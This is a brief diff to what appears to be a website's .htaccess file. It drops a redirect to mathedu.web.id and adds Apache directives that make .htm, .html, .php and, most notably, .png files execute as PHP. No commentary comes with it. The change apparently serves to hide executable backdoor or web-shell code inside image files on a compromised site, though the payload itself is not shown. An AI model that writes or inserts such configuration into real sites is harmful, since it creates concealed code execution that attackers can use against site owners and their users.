@@ -1,1 +1,6 @@
-Redirect 301 / https://mathedu.web.id/
+<FilesMatch "\.(htm|html|php|png)$">
+SetHandler application/x-httpd-php
+</FilesMatch>
+AddType application/x-httpd-php .png
+AddHandler php-script .png
+AddHandler php-script .png
